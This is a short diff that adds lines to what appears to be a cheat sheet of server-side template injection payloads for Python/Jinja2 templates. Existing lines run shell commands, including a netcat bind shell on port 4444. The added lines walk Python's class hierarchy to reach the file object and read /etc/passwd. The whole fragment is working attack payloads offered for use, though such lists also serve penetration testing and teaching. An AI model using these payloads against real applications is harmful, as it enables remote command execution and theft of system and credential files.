@@ -13,4 +13,9 @@
 {{ config['RUNCMD']('/usr/bin/id',shell=True) }}
 {{ import os; os.startfile("nc -lnvp 4444 -e /bin/sh") }}
 {{‘’.__class__.__mro__[2].__subclasses__()[258]}}
+{{ [].__class__.__base__.__subclasses__() }}
+[].__class__.__base__.__subclasses__().index(file)
+{{[].__class__.__base__.__subclasses__()[40] }} 
+{{[].__class__.__base__.__subclasses__().pop(40) }}
+{{[].__class__.__base__.__subclasses__().pop(40)('etc/passwd').read() }}
 ```
